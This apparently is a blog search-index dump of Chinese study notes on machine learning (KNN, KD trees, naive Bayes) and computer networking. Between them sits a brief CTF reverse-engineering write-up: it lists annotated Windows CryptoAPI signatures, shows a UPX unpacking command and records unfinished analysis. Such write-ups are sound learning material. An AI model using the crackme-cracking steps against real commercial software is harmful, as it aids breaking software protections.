asset_img 2.4.8.png 例题分析 %}\n\n{% asset_img 2.4.9.png 例题分析 %}\n\n## 2.5 算法的收敛性\n\n{% asset_img 2.5.1.png 定理 %}\n\n{% asset_img 2.5.2.png 定理的证明 %}\n\n{% asset_img 2.5.3.png 定理的证明 %}\n\n{% asset_img 2.5.4.png 定理的证明 %}\n\n{% asset_img 2.5.5.png 定理的证明 %}\n\n{% asset_img 2.5.6.png 定理的证明 %}\n\n{% asset_img 2.5.7.png 算法的收敛性 %}\n\n# 3. K近邻\n\n## 3.1 K近邻相关概念\n\n{% asset_img 3.1.1.png K近邻概念 %}\n\n{% asset_img 3.1.2.png K近邻直观理解 %}\n\nK近邻算法：\n\n{% asset_img 3.1.3.png K近邻算法 %}\n\n误差率：\n\n{% asset_img 3.1.4.png 误差率 %}\n\n{% asset_img 3.1.5.png 误差率 %}\n\n{% asset_img 3.1.6.png 误差率 %}\n\n{% asset_img 3.1.7.png 误差率 %}\n\n## 3.2 K近邻三要素\n\n### 3.2.1 K近邻模型\n\n{% asset_img 3.2.1.png K近邻模型 %}\n\n### 3.2.2 距离度量\n\n{% asset_img 3.2.2.png 距离度量 %}\n\n{% asset_img 3.2.3.png 距离度量 %}\n\n{% asset_img 3.2.4.png 例子 %}\n\n{% asset_img 3.2.5.png 例子 %}\n\n{% asset_img 3.2.6.png 例子 %}\n\n### 3.2.3 K值的选择\n\n近似误差：可以理解为对现有训练集的训练误差。\n\n估计误差：可以理解为对测试集的测试误差。\n\n{% asset_img 3.2.7.png K值的选择 %}\n\n### 3.2.4 分类决策规则\n\n{% asset_img 3.2.8.png 分类决策规则 %}\n\n{% asset_img 3.2.9.png 分类决策规则 %}\n\n{% asset_img 3.2.10.png 分类决策规则 %}\n\n## 3.3 构造KD树\n\n{% asset_img 3.3.1.png 什么是KD树 %}\n\n{% asset_img 3.3.2.png 构造KD树 %}\n\n例子：\n\n{% asset_img 3.3.3.png 构造KD树例子 %}\n\n{% asset_img 3.3.4.png 构造KD树例子 %}\n\n{% asset_img 3.3.5.png 构造KD树例子 %}\n\n{% asset_img 3.3.6.png 构造KD树例子 %}\n\n{% asset_img 3.3.7.png 构造KD树例子 %}\n\n{% asset_img 3.3.8.png 构造KD树例子 %}\n\n## 3.4 搜索KD树\n\n最近邻搜索：\n\n- 寻找“当前最近点”：寻找最近邻的子结点作为目标点的“当前最近点”\n- 回溯：以目标点和“当前最近点”的距离沿树根部进行回溯和迭代\n\n最近邻搜索算法：\n\n{% asset_img 3.4.1.png 最近邻搜索算法 %}\n\n例子：\n\n{% asset_img 3.4.2.png 最近邻搜索算法例子 %}\n\n{% asset_img 3.4.3.png 最近邻搜索算法例子 %}\n\n{% asset_img 3.4.4.png 最近邻搜索算法例子 %}\n\n# 4. 朴素贝叶斯法\n\n## 4.1 贝叶斯定理\n\n条件概率：\n$$\nP(X=x|Y=y_i)=\\frac {P(X=x,Y=y_i)}{P(Y=y_i)}\n$$\n全概率公式：\n$$\nP(X=x)=\\sum_{i=1}^nP(Y=y_i)P(X=x|Y=y_i)\n$$\n贝叶斯公式：\n$$\nP(Y=y_i|X=x)=\\frac {P(X=x,Y=y_i)}{P(X=x)}=\\frac{P(Y=y_i)P(X=x|Y=y_i)}{\\sum_{i=1}^nP(Y=y_i)P(X=x|Y=y_i)}\n$$\n{% asset_img 4.1.3.png 贝叶斯定理 %}\n\n{% asset_img 4.1.4.png 朴素贝叶斯 %}\n\n{% asset_img 4.1.5.png 朴素贝叶斯分类 %}\n\n## 4.2 何为朴素\n\n{% asset_img 4.1.1.png 朴素贝叶斯 %}\n\n{% asset_img 4.1.2.png 朴素贝叶斯 %}\n\n参数个数：\n\n{% asset_img 4.2.1.png 朴素贝叶斯 %}\n\n“朴素”即为条件独立性假设，即特征之间相互独立。\n\n{% asset_img 4.2.2.png 朴素贝叶斯 %}\n\n## 4.3 后验概率最大化\n\n将期望风险最小化转化为后验概率最大化的问题。\n\n{% asset_img 4.3.1.png 后验概率最大化 %}\n\n## 4.4 极大似然估计\n\n{% asset_img 4.4.1.png 先验概率与条件概率 %}\n\n极大似然估计原理：\n\n{% asset_img 4.4.2.png 极大似然估计原理 %}\n\n极大似然估计实现：\n\n{% asset_img 4.4.3.png 极大似然估计例子 %}\n\n{% asset_img 4.4.4.png 极大似然估计例子 %}\n\n{% asset_img 4.4.5.png 极大似然估计例子 %}\n\n{% asset_img 4.4.6.png 极大似然估计例子 %}\n\n{% asset_img 4.4.7.png 极大似然估计例子 %}\n\n{% asset_img 4.4.8.png 极大似然估计例子 %}\n\n## 4.5 算法\n\n{% asset_img 4.5.1.png 朴素贝叶斯算法 %}\n\n{% asset_img 4.5.2.png 朴素贝叶斯例子 %}\n\n{% asset_img 4.5.3.png 朴素贝叶斯例子 %}\n\n## 4.6 贝叶斯估计\n\n{% asset_img 4.6.1.png 贝叶斯估计 %}\n\n{% asset_img 4.6.2.png 贝叶斯估计 %}\n\n{% asset_img 4.6.3.png 贝叶斯估计 %}\n\n{% asset_img 4.6.4.png 贝叶斯估计 %}\n\n{% asset_img 4.6.5.png 贝叶斯估计 %}\n\n{% asset_img 4.6.6.png 贝叶斯估计 %}\n\n{% asset_img 4.6.7.png 贝叶斯估计 %}\n\n{% asset_img 4.6.8.png 正则化 %}\n\n{% asset_img 4.6.9.png 贝叶斯估计 %}","categories":["基础知识"],"tags":["机器学习"]},{"title":"2022DASCTF Apr X FATE 防疫挑战赛","url":"/posts/5850d757.html","content":"\n小菜鸡打CTF。\n\n<!--more-->\n\n# 1. Crackme\n\n无壳，32位EXE程序。运行一下。\n\n{% asset_img 1.1.png 运行结果 %}\n\n载入IDA，定位关键字符串和定位关键函数。先大概分析一下。\n\n{% asset_img 1.4.png IDA分析 %}\n\n{% asset_img 1.3.png IDA分析 %}\n\n{% asset_img 1.5.png IDA分析 %}\n\n```c\n// 获取CSP中特定密钥容器的句柄\nBOOLEAN CRYPTFUNC CryptAcquireContext(\n  [out]HCRYPTPROV* phProv,       //返回csp句柄\n  [in]LPCTSTR pszContainer,      //密钥容器名称，用于标识CSP的密钥容器\n  [in]LPCTSTR pszProvider,       //指向CSP名称的字符串指针，如果为NULL，则使用默认的CSP\n  [in]DWORD dwProvType,          //CSP类型，用于标识CSP容器支持哪些加密算法（加密解密时的具体算法需要看生成密钥的函数才能确定）\n  [in]DWORD dwFlags              //标志\n);                               //失败返回0，成功返回非0\n\n// 获取CSP哈希对象句柄，可以使用此句柄来哈希数据和会话密钥\nBOOL CRYPTFUNC CryptCreateHash(\n  [in]HCRYPTPROV hProv,          //csp句柄\n  [in]ALG_ID Algid,         　   //【重要】哈希算法标识(CALG_MD5=0x8003，CALG_SHA_1=0x8004等)\n  [in]HCRYPTKEY hKey,            //如果哈希算法是密钥哈希，如HMACH或者MAC算法，就用此密钥句柄传递密钥，对于非密钥算法，此参数为NULL\n  [in]DWORD dwFlags,             //保留，必须为0\n  [out]HCRYPTHASH* phHash        //返回创建的哈希对象句柄\n);                               //成功返回1，失败返回0\n\n// 计算一段数据的哈希值并加入到指定的哈希句柄中\nBOOL WINAPI CryptHashData(\n  [in]HCRYPTHASH hHash,          //哈希句柄\n  [in]BYTE* pbData,              //要添加到哈希对象的数据指针\n  [in]DWORD dwDataLen,           //数据长度\n  [in]DWORD dwFlags              //标识(所有Microsoft加密服务提供商都忽略此参数)\n);                               //成功返回1，失败返回0\n\n// 从哈希对象中查询指定参数（可以获取CryptHashData哈希结果）\nBOOL WINAPI CryptGetHashParam(\n  [in]      HCRYPTHASH hHash,    //哈希句柄\n  [in]      DWORD dwParam,       //需要获取参数的类型标识（哈希算法=1，哈希值=2，哈希值长度=4）\n  [out]     BYTE *pbData,        //缓冲区指针\n  [in,out]  DWORD *pdwDataLen,   //缓冲区长度\n  [in]      DWORD dwFlags        //保留，必须为0\n);                               //成功返回1，失败返回0\n\n// 销毁的哈希对象的句柄\nBOOL CryptDestroyHash(\n  [in] HCRYPTHASH hHash\n);\t\t\t\t\t\t\t\t//成功返回1，失败返回0\n\n// 释放加密服务提供者(CSP)和密钥容器的句柄\nBOOL CryptReleaseContext(\n  [in] HCRYPTPROV hProv,\n  [in] DWORD      dwFlags\t\t//保留，必须为0\n);\t\t\t\t\t\t\t\t//成功返回1，失败返回0\n\n// 生成从基础数据值派生的加密会话密钥\nBOOL CRYPTFUNC CryptDeriveKey(\n  [in]HCRYPTPROV hProv,          //csp句柄\n  [in]ALG_ID Algid,              //【重要】用于生成密钥的算法标识(CALG_AES_128=0x660e等)\n  [in]HCRYPTHASH hBaseData,      //用CryptHashData计算数据哈希后，返回的哈希对象句柄\n  [in]DWORD dwFlags,             //生成密钥的类型（是否需要补位、密钥是否可以导出等）\n  [out]HCRYPTKEY* phKey          //返回新生成密钥的句柄指针\n);                               //成功返回1，失败返回0\n\n// 用随机数生成加密会话密钥或公/私钥对\nBOOL WINAPI CryptGenKey(\n  [in]   HCRYPTPROV hProv,       //csp句柄\n  [in]   ALG_ID Algid,           //【重要】指定生成密钥的算法标识(CALG_MD5/CALG_SHA_256等)\n  [in]   DWORD dwFlags,          //生成密钥的类型（生成会话密钥、密钥是否可以导出等）\n  [out]  HCRYPTKEY *phKey        //返回创建的密钥句柄\n);                               //成功返回1，失败返回0\n\n// 导入加密密钥到csp\nBOOL WINAPI CryptImportKey(\n  _In_   HCRYPTPROV hProv,       //csp句柄\n  _In_   BYTE *pbData,           //密钥缓冲区（由CryptExportKey函数返回）\n  _In_   DWORD dwDataLen,        //缓冲区长度\n  _In_   HCRYPTKEY hPubKey,      //用于解密pbData参数的密钥句柄（如果pbData参数指向的密钥未加密，此参数=0）\n  _In_   DWORD dwFlags,          //该参数仅在将PRIVATEKEYBLOB形式的公钥/私钥对导入到CSP时才使用\n  _Out_  HCRYPTKEY *phKey        //返回导入密钥后的句柄\n);                               //失败返回0，成功返回非0\n\n// 导出加密密钥到csp\nBOOL CryptExportKey(\n  [in]      HCRYPTKEY hKey,          //要导出的密钥句柄\n  [in]      HCRYPTKEY hExpKey,       //目标用户的密钥句柄，通常为NULL\n  [in]      DWORD     dwBlobType,    //指定要导出的密钥类型（公钥、私钥等）\n  [in]      DWORD     dwFlags,       //附加选项，通常为NULL\n  [out]     BYTE      *pbData,       //接收导出数据的缓冲区，如果为NULL则在pdwDataLen参数中返回需要的长度\n  [in,out]  DWORD     *pdwDataLen    //缓冲区长度\n);\n\n// 导入公钥Key\nBOOL WINAPI CryptImportPublicKeyInfo(\n  [in]   HCRYPTPROV hCryptProv,              //CSP句柄\n  [in]   DWORD dwCertEncodingType,           //指定使用的编码类型\n  [in]   PCERT_PUBLIC_KEY_INFO pInfo,        //CERT_PUBLIC_KEY_INFO结构的地址,其中包含要导入的公钥和算法\n  [out]  HCRYPTKEY *phKey                    //用于接收导入公钥的句柄\n);\n\n// 设置密钥参数\nBOOL WINAPI CryptSetKeyParam(\n  [in]HCRYPTKEY hKey,            //要设置参数的密钥句柄\n  [in]DWORD dwParam,             //参数类型（例如设置AES_CBC加密算法中的向量IV）\n  [in]BYTE* pbData,              //参数缓冲区的指针（如果参数类型是向量IV，该缓冲区保存的就是IV值）\n  [in]DWORD dwFlags              //保留，必须为零\n);                               //成功返回1，失败返回0\n\n// 获取密钥参数\nBOOL CRYPTFUNC CryptGetKeyParam(\n  [in]HCRYPTKEY hKey,            //要查询的密钥句柄\n  [in]DWORD dwParam,             //参数类型\n  [out]BYTE* pbData,             //参数缓冲区的指针\n  [in,out]DWORD* pdwDataLen,     //长度\n  [in]DWORD dwFlags              //保留，必须为零\n);                               //成功返回1，失败返回0\n\n// 加密数据\nBOOL WINAPI CryptEncrypt(\n  [in]     HCRYPTKEY hKey,       //【重要】加密密钥句柄,密钥指定了使用的加密算法（由CryptGenKey或CryptImportKey函数返回）\n  [in]     HCRYPTHASH hHash,     //哈希对象句柄（如果要同时对数据进行散列和加密，可以使用该参数，否则NULL）\n  [in]     BOOL Final,           //指定这是否是正在被加密数据的最后一节。如果是最后一部分或唯一的一部分，这个值为真;\n  [in]     DWORD dwFlags,        //保留，必须为0\n  [in,out]  BYTE *pbData,        //明文数据缓冲区，加密后保存密文\n  [in,out]  DWORD *pdwDataLen,   //pbData缓冲区中明文的长度\n  [in]     DWORD dwBufLen        //pbData缓冲区的总大小（以字节为单位）（根据算法不同，加密文本可能比原始明文大）\n);\n\n// 解密数据\nBOOL CRYPTFUNC CryptDecrypt(\n  [in]HCRYPTKEY hKey,            //【重要】解密密钥句柄，该密钥指定了要使用的解密算法（由CryptGenKey或CryptImportKey函数返回）\n  [in]HCRYPTHASH hHash,          //哈希对象句柄，如果不需要散列设置为零\n  [in]BOOL Final,                //指定这是否是正在被解密数据的最后一节。如果是最后一部分或唯一的一部分，这个值为真;\n  [in]DWORD dwFlags,             //保留，必须为零\n  [in,out]BYTE* pbData,          //加密数据缓冲区，解密后保存明文\n  [in,out]DWORD* pdwDataLen      //缓冲区长度\n);                               //成功返回1，失败返回0\n\n// 释放hKey参数引用的句柄\nBOOL CryptDestroyKey(\n  [in] HCRYPTKEY hKey\n);\t\t\t\t\t\t\t\t//成功返回1，失败返回0\n\n// 解码由lpszStructType参数指定的类型数据\nBOOL CryptDecodeObjectEx(\n  [in]      DWORD              dwCertEncodingType,    //使用的编码类型（不重要）\n  [in]      LPCSTR             lpszStructType,        //【重要】结构体类型常量标识（标识pbEncoded是什么类型的结构体）\n  [in]      const BYTE         *pbEncoded,            //指向要解码的数据指针（该结构必须是lpszStructType指定的类型）\n  [in]      DWORD              cbEncoded,             //pbEncoded数据长度\n  [in]      DWORD              dwFlags,               //可选标识\n  [in]      PCRYPT_DECODE_PARA pDecodePara,           //指向包含解码段落信息的CRYPT_DECODE_PARA结构的指针。\n  [out]     void               *pvStructInfo,         //接收解码后数据的缓冲区指针\n  [in,out] DWORD              *pcbStructInfo          //pvStructInfo缓冲区长度\n);\n\n// 将字符串转换成指定标识的字节数组\nBOOL WINAPI CryptStringToBinary(\n  [in]     LPCTSTR pszString,    //要转换字符串的指针\n  [in]     DWORD cchString,      //要转换字符串的长度，不包括终止NULL字符。如果此参数为零，则pszString是以null结尾的字符串。\n  [in]     DWORD dwFlags,        //转换标识（ASCII、十六进制、Base64等）\n  [in]     BYTE *pbBinary,       //接收转换后数据的缓冲区指针（如果为NULL则自动计算pcbBinary长度）\n  [in,out] DWORD *pcbBinary,     //pbBinary参数长度（以字节为单位，如果为0则忽略pbBinary参数）\n  [out]    DWORD *pdwSkip,       //可选参数\n  [out]    DWORD *pdwFlags       //可选参数\n);                               //成功返回1，失败返回0\n```\n\n[ALG_ID 标识符与值的映射表](https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/alg-id?redirectedfrom=MSDN)\n\n经过综上分析，可以总结：\n\n{% asset_img 1.2.1.png IDA分析 %}\n\n# 2. FakePica\n\n运行一下啥都没发生。\n\n{% asset_img 2.1.png 运行程序 %}\n\n载入AK，发现找不到入口文件。但看到它有so文件。\n\n{% asset_img 2.2.png AK %}\n\n{% asset_img 2.3.png AK %}\n\n解包将so文件载入IDA查看导出表，发现好乱...应该是混淆了。\n\n{% asset_img 2.4.png IDA %}\n\n{% asset_img 2.5.png IDA %}\n\n# 3. 奇怪的交易\n\n一个有UPX壳的64位ELF文件，直接拿去kali脱壳。\n\n```\nupx -d trade\n```\n\n脱壳后载入IDA没有找到关键字符串。\n\n无从下手啊，等大佬们的wp。。。","categories":["Windows逆向"],"tags":["CTF","Reverse"]},{"title":"计算机网络","url":"/posts/e255a10a.html","content":"\n这个笔记配合[计算机网络微课堂](https://www.bilibili.com/video/BV1c4411d7jb)食用效果更佳，这位老师的PPT做得真的好，讲得也特别简单易懂，力推！\n\n<!--more-->\n\n# 1. 计算机网络概述\n\n## 1.1 网络、互连网(互联网)和因特网\n\n网络(Network)由若干结点(Node)和连接这些结点的链路(Link)组成。\n\n多个网络还可以通过路由器互连起来，这样就构成了一个覆盖范围更大的网络，即互联网(或互连网)。因此，互联网是“网络的网络(Netwrok of Networks)”。\n\n因特网(Internet)是世界上最大的互连网络(用户数以亿计，互连的网络数以百万计)。\n\ninternet与lnternet的区别：\n\n- internet(互联网或互连网)是一个通用名词，它泛指由多个计算机网络互连而成的网络。在这些网络之间的通信协议可以是任意的。\n- Internet(因特网) 则是一个专用名词，它指当前全球最大的、开放的、由众多网络相互连接而成的特定计算机网络，它采用TCP/IP协议族作为通信的规则，其前身是美国的ARPANET。\n\n## 1.2 因特网发展的三个阶段\n\n{% asset_img 1.1.png 因特网发展的三个阶段 %}\n\n因特网服务提供者ISP(Internet Service Provider)：提供给用户IP地址的角色，每个用户通过ISP提供的IP地址使用互联网，没有IP地址不可以使用互联网。我国主要的ISP是我们熟悉的中国电信、中国联通和中国移动这三大电信运营商。\n\n{% asset_img 1.2.png  基于ISP的三级结构互联网  %}\n\n## 1.3 因特网的组成\n\n因特网由边缘部分和核心部分组成。\n\n1. 边缘部分\n由所有连接在因特网上的主机组成。这部分是用户直接使用的，用来进行通信(传送数据、音频或视频)和资源共享\n\n2. 核心部分\n由大量网络和连接这些网络的路由器组成。这部分是为边缘部分提供服务的(提供连通性和交换)\n\n## 1.4 计算机网络三种数据交换方式\n\n### 1.4.1 电路交换\n\n电话交换机接通电话线的方式称为电路交换。\n\n从通信资源的分配角度来看，交换(Switching)就是按照某种方式动态地分配传输线路的资源。\n\n电路交换的三个步骤：\n\n1. 建立连接（分配通信资源)\n2. 通话（一直占用通信资源)\n3. 释放连接（归还通信资源)\n\n在建立后不论通信资源有没有使用，都不会进行中断，除非用户中断。当使用电路交换来传送计算机数据时, 其线路的传输效率往往很低。\n\n### 1.4.2 分组交换\n\n把整块数据/信息分为多个数据段(相对于报文传输而言)，数据段分开传输。在数据段前面加上首部后，成为一个分组。以分组为单位传输。\n\n各个分组交换机会把分组先存储下来，然后根据其头部信息中的目的地址，发送给下一个交换机。各个交换机进行对分组信息的储存转发后，最终到达接收方。接收方处理及再去除分组首部，还原出报文。传输完成。\n\n在转发过程中有两个特点：\n\n1. 各分组从发送方到达接收方可以经过不同的交换机。\n2. 各分组到达接收方的顺序不定，可能出现乱序。\n\n在分组传输中各个角色主要功能：\n\n- 发送方：构造分组，发送分组\n- 路由器：缓存分组，转发分组\n- 接收方：接受分组，还原报文\n\n### 1.4.3 报文交换\n\n每一个结点接收整个报文，检查目标结点地址，然后根据网络中的通信情况在适当的时候转发到下一个结点。经过多次存储转发，最后到达目标，因而这样的网络叫存储转发网络。其中的交换结点要有足够大的存储空间(一般是磁盘)，用以缓冲收到的长报文。 \n\n报文交换主要用于早期的电报通信网，现在较少使用，通常被较先进的分组交换方式所取代。\n\n### 1.4.4 三种交换方式的对比\n\n{% asset_img 1.4.4.png  三种交换方式的对比  %}\n\n## 1.5 计算机网络的定义和分类\n\n计算机网络主要是一些通用的、可编程的硬件互连而成的，而这些硬件并非专门用来实现某一特定目的的，这些可编程的硬件能够用来传送多种不同类型的数据(如音频、数据等)，这些可编程的软件能支持广泛和日益增长的应用。\n\n1. 按照交换技术分类\n\n   - 电路交换网络\n   - 报文交换网络\n   - 分组交换网络\n\n2. 按使用者分类\n\n   - 公用网：电信公司构建的大型网络，面对公众开放，只要交钱既可使用，又叫公众网\n   - 专用网：某个部门为本单位的特殊业务工作需要而建造的网络。例如铁路部门、电信部门专门为自己构建的，不对外开放的网络\n\n3. 按照传输介质分类\n\n   - 有线网：双绞线(日常使用网线)、光纤\n   - 无线网：WIFI\n\n4. 按覆盖范围分类\n\n   - 广域网 WAN：覆盖面积通常为几十公里到几千公里，可以覆盖国家范围、洲际范围，有时也称为远程网。负责互连分布在不同区域的城域网和局域网，是最大范围的网络。\n   - 城域网 MAN：覆盖范围一般是一个城市。作用距离为5到50公里。通常作为城市骨干网，互连大量企业、机构、学校。\n   - 局域网 LAN：局域网一般是微信计算机或工作站通过告诉线路相连，范围一般是一个实验室、一栋楼或一个校园。覆盖范围1公里左右，通常由某个单位单独拥有、使用和维护。\n   - 个域网 PAN：个人区域网络。非用来连接普通计算机，而是在个人工作的地方把个人使用的电子设备，鼠标、键盘、耳机等用无线的方式连接起来形成的个人网络系统。覆盖范围10米左右。\n\n5. 按拓扑结构分类\n\n   - 总线型网络：总线型网络用单根传输线把计算机连接起来。\n\n     优点是建网容易，增减节点方便，节省线路。\n\n     缺点是重负载时通信效率不高，任意一处出现故障后全网瘫痪。\n\n   - 星型网络：星型网络是将每个计算机都以单独的线路与中央设备相连。中央设备现在一般是交换机或路由器。\n\n     优点：便于网络的集中控制和管理。\n\n     缺点：成本高，中央设备对故障敏感。\n\n   - 环型网络：环形网络是将所有计算机网络接口连接成一个环。环可以是单环或者双环，环中信号是单向传输的。\n\n   - 网状型网络：在网状结构中，每个节点至少由两条路径与其他节点相连接，多用在广域网中。\n\n     优点：可靠性高。\n\n     缺点：控制复杂，线路成本高。\n\n以上四种结构中可以任意组合形成更加复杂的网络。\n\n## 1.6 计算机网络的性能指标\n\n### 1.6.1 速率\n\n{% asset_img 1.6.png 速率 %}\n\n### 1.6.2 带宽\n\n用来表示网络的通信线路所能传送数据的能力，因此网络带宽表示在单位时间内从网络中的某一点到另一个点所能通过的“最高数据率”。\n\n单位：b/s(kb/s, Mb/s, Gb/s, Tb/s)，与速率相同。\n\n### 1.6.3 吞吐量\n\n吞吐量表示在单位时间内通过某个网络(或信道、接口)的数据量。\n\n吞吐量被经常用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。\n\n吞吐量受网络的带宽或额定速率的限制。\n\n### 1.6.4 时延\n\n$$\n网络时延=发送时延+传播时延+处理时延\n$$\n\n**发送时延**\n$$\n发送时延=\\frac{分组长度(b)}{发送速率(b/s)}\n$$\n发送速率受网卡的发送速率、信道带宽、接口速率影响。发送效率遵循木桶原理，由速率最低的模块决定，所以在选择网线、路由器等设备时，要考虑到整体的速率平衡问题。\n\n发送速率 = min[网卡发送速率，信道带宽，交换机或路由器的接口速率]\n\n**传播时延**\n$$\n传播时延=\\frac{信道长度(m)}{电磁波传播速率(m/s)}\n$$\n电磁波在自由空间的传播速率：$ v=3\\times 10^8 m/s$\n\n在铜线中：$v=2.3\\times 10^8 m/s$\n\n在光纤中：$v=2.0\\times 10^8 m/s$\n\n要计算传播时延，先确定传播媒体，进而可以确定电磁波在该传输媒体中的传输速率。\n\n**处理时延**\n\n处理时延是路由器收到分组后对其进行存储转发产生的时延。不方便计算。排队时延也归到处理时延中。\n\n在题目中，一般会写“处理时延忽略不计”。发送时延占主导还是传播时延占主导，要根据具体例子实际分析。\n\n{% asset_img 1.6.4.png 例题 %}\n\n{% asset_img 1.6.5.png 总结 %}\n\n### 1.6.5 时延带宽积\n\n$$\n时延带宽积=传播时延×带宽\n$$\n\n若发送端连续发送数据，则在所发送的第一个比特即将到达终点时，发送端就已经发送了时延带宽积个比特。\n\n链路的时延带宽积又称为以比特为单位的链路长度。\n\n### 1.6.6 往返时间(RTT)\n\n从发送端发送信息开始，到发送端接收到来自接收端发送的确认信息，称为往返时间(RTT)。\n\n在许多情况下，因特网上的信息不仅仅单方向传输，而是双向交互。我们有时很需要知道双向交互一次所需的时间，因此，往返时间(RTT，Round-Trip Time)是一个重要的性能指标。\n\n### 1.6.7 利用率\n\n利用率分为信道利用率和网络利用率。\n\n- 信道利用率：用来表示某信道有百分之几的时间是被利用的(有数据通过)\n- 网络利用率：全网络的信道利用率的加权平均\n\n根据排队论，当某信道的利用率增大时，该信道引起的时延也会迅速增加。\n\n如果令：\n\n- $D_0$：网络空闲时延\n- $D$：网络当前时延\n- $U$：利用率\n\n那么则有下列关系：\n$$\nD=\\frac{D_0}{1-U}\n$$\n\n- 当网络的利用率达到50%时，时延就要加倍\n- 当网络的利用率超过50%时，时延急剧增大\n- 当网络的利用率接近100%时，时延就趋于无穷大\n\n因此，一些拥有较大主干网的ISP通常会控制它们的信道利用率不超过50%。如果超过了，就要准备扩容，增大线路的带宽。也不能使信道利用率太低，这会使宝贵的通信资源被白白浪费。应该使用一些机制，可以根据情况动态调整输入到网络中的通信量，使网络利用率保持在合理范围内。\n\n### 1.6.8 丢包率\n\n1. 丢包率即分组丢失率，是指在一定的时间范围内，传输过程中丢失的分组数量与总分组数量的比率。\n2. 丢包率具体可分为接口丢包率、结点丢包率、链路丢包率、路径丢包率、网络丢包率等。\n3. 丢包率是网络运维人员非常关心的一个网络性能指标，但对于普通用户来说往往并不关心这个指标，因为他们通常意识不到网络丢包。\n4. 分组丢失主要有两种情况：\n   - 分组在传输过程中出现误码，被结点丢弃；\n   - 分组到达一台队列已满的分组交换机时被丢弃；在通信量较大时就可能造成网络拥塞。\n5. 因此，丢包率反映了网络的拥塞情况：\n   - 无拥塞时路径丢包率为0\n   - 轻度拥塞时路径丢包率为1%~4%\n   - 严重拥塞时路径丢包率为5%~15%\n\n## 1.7 计算机网络体系结构\n\n{% asset_img 1.7.1.png 计算机网络体系结构 %}\n\n{% asset_img 1.7.2.png 计算机网络体系结构 %}\n\n{% asset_img 1.7.4.png OSI模型的各层的作用 %}\n\n{% asset_img 1.7.3.png 五层体系结构各层的作用 %}\n\n[必看！计算机网络体系结构的分层思想](https://www.bilibili.com/video/BV1c4411d7jb?p=9)，这个PPT做得真的绝了。\n\n### 1.7.1 计算机网络体系结构中的专用术语\n\n#### 1.7.1.1 实体\n\n实体：任何可发送或接受信息的硬件或软件进程。\n\n对等实体：收发双方相同层次中的实体。\n\n{% asset_img 1.7.1.1.png 实体 %}\n\n#### 1.7.1.2 协议\n\n协议：控制两个对等实体进行逻辑通信的规则的集合。\n\n协议的三要素：语法、语义、同步\n\n- 语法：定义所交换信息的格式\n- 语义：定义收发双方所要完成的操作\n- 同步：定义收发双方的时序关系\n\n#### 1.7.1.3 服务\n\n在协议的控制下，两个对等实体间的逻辑通信使得本层能够向上一层提供服务。\n\n要实现本层协议，还需要使用下面一层所提供的服务。\n\n协议是“水平的”，服务是“垂直的”。\n\n实体看得见相邻下层所提供的服务，但并不知道实现该服务的具体协议。也就是说，下面的协议对上面的实体是“透明”的。\n\n{% asset_img 1.7.1.2.png 服务 %}\n\n服务访问点：在同一系统中相邻两层的实体交换信息的逻辑接口，用于区分不同的服务类型。\n\n- 数据链路层的服务访问点为帧的“类型”字段。\n- 网络层的服务访问点为IP数据报首部中的“协议字段”。\n- 运输层的服务访问点为“端口号”。\n\n服务原语：上层使用下层所提供的服务必须通过与下层交换一些命令。\n\n协议数据单元PDU：对等层次之间传送的数据包称为该层的协议数据单元。\n\n服务数据单元SDU：同一系统内，层与层之间交换的数据包。\n\n多个SDU可以合成为一个PDU；一个SDU也可划分为几个PDU。\n\n{% asset_img 1.7.1.3.png 服务 %}\n\n# 2. 物理层\n\n## 2.1 基本概念\n\n物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流。\n\n物理层为数据链路层屏蔽了各种传输媒体的差异，使数据链路层只需要考虑如何完成本层的协议和服务，而不必考虑网络具体的传输媒体是什么。\n\n传输媒体不属于任何一层，如果一定要分类，则属于物理层。\n$$\n传输媒体\\begin{cases}导引型传输媒体：同轴电缆\n、双绞线、\n光纤\\\\\\\\非导引型传输媒体：微波通信\\end{cases}\n$$\n物理层协议的主要任务：\n\n- 机械特性：指明接口所用接线器的形状和尺寸、引脚数目和排列、固定和锁定装置。\n- 电气特性：指明在接口电缆的各条线上出现的电压的范围。\n- 功能特性：指明某条线上出现的某一电平的电压表示何种意义。\n- 过程特性：指明对于不同功能的各种可能事件的出现顺序。\n\n由于传输媒体种类众多(双绞线、光纤等)，物理连接方式也很多(点对点连接、广播连接等)，因此物理协议有很多种，但是每一种都需要包括以上四个特性。\n\n## 2.2 物理层下面的传输媒体\n\n### 2.2.1 导引型传输媒体\n\n在导引型传输媒体中，电磁波被导引沿着固体传播媒体传播。\n\n常见的导引型传输媒体有：\n\n- 同轴电缆：生活中最常见的就是电视线。用于模拟传输。价格较贵，布线不够灵活方便。\n\n- 双绞线：双绞线是最古老又常用的传输媒体。也就是生活中最常见的网线。双绞线的构成就是把两个互相绝缘的铜导线并排放在一起，按照一定规则绞合起来，因此称为双绞线。\n\n  绞合的作用：①抵御部分来自外界的电磁波干扰；②减少来自相邻导线的电磁干扰。\n\n- 光纤：每一根光纤是非常细的，因此需要将它做成很结实的光缆，一根光缆少则只有一根光纤，多则可能有数十根甚至数百根光纤。 光纤的芯非常细。\n\n  优点：①通信容量大；②传输损耗小，远距离传输时更加经济；③抗雷电和电磁干扰性能好，在大电流脉冲干扰的环境下尤为重要；④无串音干扰，保密性好，不易被窃听；⑤体积小，重量轻。\n\n  缺点：①割接需要专用设备；②光电接口价格较贵。\n\n- 电力线：电力线是一种比较古老的技术。应用电力线传输信号的实例最早是电力线电话。但是在目前，以电力线构建局域网已不能满足需求。\n\n### 2.2.2 非导引型传输媒体\n\n非导引型的传播媒体是自由空间。\n\n{% asset_img 2.2.2.png 电磁波频率谱 %}\n\n电磁波频率过大对人体有害，因此一般使用介于无线电波到红外的频率来进行信息传播。\n\n常见的非导引型传输媒体有：\n\n- 无线电波：无线电波用于国际广播、海事和航空通讯等。无线电波中的低频和中频端主要以地面波形式传播。高频和甚高频主要用电离层的反射传播。\n- 微波：微波用于无线电话、无线网络、雷达、人造卫星接收等。在数据通信中占有重要地位。微波在空间中主要以直线传播，其传播距离一般只有50公里左右。传统的微波通信主要有地面微波接力通信和卫星通信。\n- 红外线：利用红外线传输数据，例如电视遥控等。红外通信属于点对点无线传输。不能越障，传输距离短，传输速率低。\n- 可见光：LIFI可以实现使用可见光通信，但是目前还在实验阶段，所以暂时无法取代WIFI。\n\n## 2.3 物理层的传输方式\n\n### 2.3.1 